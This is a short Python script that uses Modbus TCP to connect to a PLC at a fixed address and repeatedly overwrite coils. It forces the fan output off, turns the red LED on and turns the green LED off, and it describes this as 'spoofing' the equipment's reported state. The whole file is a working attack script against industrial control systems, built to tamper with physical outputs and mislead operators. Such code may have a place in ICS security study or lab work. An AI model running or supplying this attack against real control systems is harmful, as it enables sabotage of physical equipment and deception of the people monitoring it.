from pymodbus.client.sync import ModbusTcpClient
import time

def find_plc_ip():
    # This is a placeholder function to simulate finding the PLC's IP address.
    # In a real scenario, you would use network scanning tools or predefined configurations.
    return "192.168.9.24"

def spoof_reporting_message(plc_ip):
    # Connect to the PLC using Modbus TCP
    client = ModbusTcpClient(plc_ip)
    if not client.connect():
        print("Failed to connect to the PLC.")
        return

    try:
        while True:
            # Spoof the Fan output (Q_FAN) to make it appear as if the fan is off
            client.write_coil(0, False)  # Address 0 corresponds to %Q0.0 (Q_FAN)
            print("Spoofed Q_FAN to False (Fan Off)")

            # Spoof the FanA Red LED (Q_REDA) to make it appear as if the fan is off
            client.write_coil(4, True)  # Address 4 corresponds to %Q0.4 (Q_REDA)
            print("Spoofed Q_REDA to True (Red LED On)")

            # Spoof the FanA Green LED (Q_GREENA) to make it appear as if the fan is off
            client.write_coil(5, False)  # Address 5 corresponds to %Q0.5 (Q_GREENA)
            print("Spoofed Q_GREENA to False (Green LED Off)")

            # Wait for a few seconds before repeating the spoofing
            time.sleep(10)

    except KeyboardInterrupt:
        print("Stopping spoofing...")
    finally:
        client.close()

if __name__ == "__main__":
    plc_ip = find_plc_ip()
    print(f"Found PLC at IP: {plc_ip}")
    spoof_reporting_message(plc_ip)